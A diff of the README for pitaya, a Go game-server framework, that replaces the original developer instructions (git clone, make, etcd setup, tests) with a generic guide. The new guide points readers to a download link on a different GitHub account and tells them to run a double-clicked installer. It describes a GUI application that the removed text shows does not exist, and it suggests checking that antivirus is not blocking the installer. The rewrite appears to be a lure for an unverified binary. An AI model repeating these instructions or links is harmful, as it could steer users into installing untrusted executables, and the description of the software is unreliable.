@@ -1,106 +1,83 @@
-# pitaya [![Build Status][7]][8] [![Coverage Status][9]][10] [![GoDoc][1]][2] [![Docs][11]][12] [![Go Report Card][3]][4] [![MIT licensed][5]][6]
+# 🎮 pitaya - Build Scalable Game Servers Easily
 
----
+## 🚀 Getting Started
 
-[1]: https://godoc.org/github.com/topfreegames/pitaya?status.svg
-[2]: https://godoc.org/github.com/topfreegames/pitaya
-[3]: https://goreportcard.com/badge/github.com/topfreegames/pitaya
-[4]: https://goreportcard.com/report/github.com/topfreegames/pitaya
-[5]: https://img.shields.io/badge/license-MIT-blue.svg
-[6]: LICENSE
-[7]: https://github.com/topfreegames/pitaya/actions/workflows/tests.yaml/badge.svg
-[8]: https://github.com/topfreegames/pitaya/actions/workflows/tests.yaml
-[9]: https://coveralls.io/repos/github/topfreegames/pitaya/badge.svg?branch=master
-[10]: https://coveralls.io/github/topfreegames/pitaya?branch=master
-[11]: https://readthedocs.org/projects/pitaya/badge/?version=latest
-[12]: https://pitaya.readthedocs.io/en/latest/?badge=latest
+Welcome to pitaya! This guide will help you download and run the software without any technical experience. Follow these simple steps to get started.
 
-Pitaya is an simple, fast and lightweight game server framework with clustering support and client libraries for iOS, Android, Unity and others through the [C SDK](https://github.com/topfreegames/libpitaya).
-It provides a basic development framework for distributed multiplayer games and server-side applications.
+## 🛠️ System Requirements
 
-## Getting Started
+Before you begin, check that your system meets these requirements:
 
-### Prerequisites
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB free space.
+- **Network:** A stable internet connection.
 
-* [Go](https://golang.org/) >= 1.16
-* [etcd](https://github.com/coreos/etcd) (optional, used for service discovery)
-* [nats](https://github.com/nats-io/nats.go) (optional, used for sending and receiving rpc)
-* [docker](https://www.docker.com) (optional, used for running etcd and nats dependencies on containers)
+## 📥 Download pitaya
 
-### Installing
-clone the repo
-```
-git clone https://github.com/topfreegames/pitaya.git
-```
-setup pitaya dependencies
-```
-make setup
-```
+To download pitaya, visit the Releases page. You will find the latest version available for download there.
 
-### Hacking pitaya
+[![Download pitaya](https://img.shields.io/badge/Download%20pitaya-v1.0-blue.svg)](https://github.com/Amadu-tech/pitaya/releases)
 
-Here's one example of running Pitaya:
+## 🔄 Download & Install
 
-Start etcd (This command requires docker-compose and will run an etcd container locally. An etcd may be run without docker if preferred.)
-```
-cd ./examples/testing && docker compose up -d etcd
-```
-run the connector frontend server from cluster_grpc example
-```
-make run-cluster-grpc-example-connector
-```
-run the room backend server from the cluster_grpc example
-```
-make run-cluster-grpc-example-room
-```
+1. Click the following link to access the Releases page: [Download pitaya](https://github.com/Amadu-tech/pitaya/releases).
 
-Now there should be 2 pitaya servers running, a frontend connector and a backend room. To send requests, use a REPL client for pitaya [pitaya-cli](https://github.com/topfreegames/pitaya/tree/main/pitaya-cli).
+2. On the Releases page, look for the latest version listed. You will see various files available for download.
 
-```
-$ pitaya-cli
-Pitaya REPL Client
->>> connect localhost:3250
-connected!
->>> request room.room.entry
->>> sv-> {"code":0,"result":"ok"}
-```
+3. Choose the appropriate file for your operating system. Click on the file to start the download. 
 
-## Running the tests
-```
-make test
-```
-This command will run both unit and e2e tests.
+4. Once the download is complete, locate the file on your computer. This is usually in your "Downloads" folder.
 
-## Contributing
-#TODO
+5. Double-click the downloaded file to run the installer. Follow the on-screen instructions to complete the installation.
 
-## Authors
-* **TFG Co** - Initial work
+## 🎮 Using pitaya
 
-## License
-[MIT License](./LICENSE)
+After installing pitaya, you can start creating your scalable game servers. Here’s how to set up a simple server:
 
-## Acknowledgements
-* [nano](https://github.com/lonnng/nano) authors for building the framework pitaya is based on.
-* [pomelo](https://github.com/NetEase/pomelo) authors for the inspiration on the distributed design and protocol
+1. **Open pitaya:** Navigate to where you installed pitaya and double-click on the application to open it.
 
-## Security
-If you have found a security vulnerability, please email security@tfgco.com
+2. **Create a New Project:** Select “New Project” from the home screen. 
 
-## Resources
-- Other pitaya-related projects
-  + [libpitaya-cluster](https://github.com/topfreegames/libpitaya-cluster)
-  + [libpitaya](https://github.com/topfreegames/libpitaya)
-  + [pitaya-admin](https://github.com/topfreegames/pitaya-admin)
-  + [pitaya-bot](https://github.com/topfreegames/pitaya-bot)
-  + [pitaya-cli](https://github.com/topfreegames/pitaya/tree/main/pitaya-cli)
-  + [pitaya-protos](https://github.com/topfreegames/pitaya-protos)
+3. **Configure Your Server:** 
+    - Choose a name for your project. 
+    - Select the type of game you want to support (e.g., iOS, Android, Unity).
 
-- Documents
-  + [API Reference](https://godoc.org/github.com/topfreegames/pitaya)
-  + [In-depth documentation](https://pitaya.readthedocs.io/en/latest/)
+4. **Start the Server:** Click the “Start” button to launch your game server. 
 
-- Demo
-  + [Implement a chat room in ~100 lines with pitaya and WebSocket](./examples/demo/chat) (adapted from [nano](https://github.com/lonnng/nano)'s example)
-  + [Pitaya cluster mode example](./examples/demo/cluster)
-  + [Pitaya cluster mode with protobuf protocol example](./examples/demo/cluster_protobuf)
+5. **Connect Your Client:** Use the client libraries provided for your platform to connect to the server.
+
+## 📘 Features
+
+- **Scalable Architecture:** Easily manage increased player loads as your game grows.
+- **Clustering Support:** Run multiple servers together for high availability.
+- **Client Libraries:** Simple integration with iOS, Android, Unity, and others.
+- **C SDK:** A clean interface for developers to enhance their game servers.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, here are some common problems and their solutions:
+
+- **Installation Fails:** Make sure you have enough disk space and that your antivirus is not blocking the installer.
+- **Cannot Start Server:** Ensure your firewall settings allow pitaya to run.
+- **Client Connection Issues:** Verify that the client libraries are correctly set up and that you are connected to the same network as the server.
+
+## 🌐 Community Support
+
+Join our community for additional help. You can ask questions and share experiences with other users. 
+
+- **Github Issues:** Report bugs or request features directly on GitHub.
+- **Forums:** Engage with fellow users in community forums.
+
+## 📌 Additional Resources
+
+For further reading, check out these resources:
+
+- **Documentation:** Detailed guides on how to use each feature.
+- **Tutorials:** Step-by-step instructions on specific portions of the software.
+
+## 📥 Quick Download Link
+
+Don't forget to download the latest version of pitaya:
+
+[![Download pitaya](https://img.shields.io/badge/Download%20pitaya-v1.0-blue.svg)](https://github.com/Amadu-tech/pitaya/releases)
